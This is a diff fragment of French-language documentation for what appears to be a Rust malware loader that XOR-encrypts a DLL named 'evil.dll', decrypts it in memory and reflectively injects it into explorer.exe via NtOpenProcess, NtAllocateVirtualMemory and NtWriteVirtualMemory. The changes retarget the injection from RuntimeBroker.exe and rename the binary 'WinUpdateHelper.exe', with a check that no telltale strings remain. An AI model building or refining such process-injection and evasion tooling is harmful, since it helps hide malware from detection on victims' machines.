@@ -32,7 +32,7 @@ build.rs: evil.dll --XOR--> evil.dll.enc (compile-time)
 main.rs:                      v
   1. Dechiffre DLL en memoire (runtime)
   2. Parse PE -> trouve ReflectiveLoader offset
-  3. Enumere processus -> RuntimeBroker.exe
+  3. Enumere processus -> explorer.exe
   4. NtOpenProcess (droits minimum)
   5. NtAllocateVirtualMemory (RW)
   6. NtWriteVirtualMemory (copie DLL)
@@ -75,7 +75,7 @@ const XOR_KEY: &[u8] = b"VotreCleIci!1234";
 
 ```bash
 # Aucune string suspecte dans le binaire
-strings WindowsHelper.exe | grep -iE "(Reflective|RuntimeBroker|evil)"
+strings WinUpdateHelper.exe | grep -iE "(Reflective|explorer|evil)"
 # -> rien
 ```
 
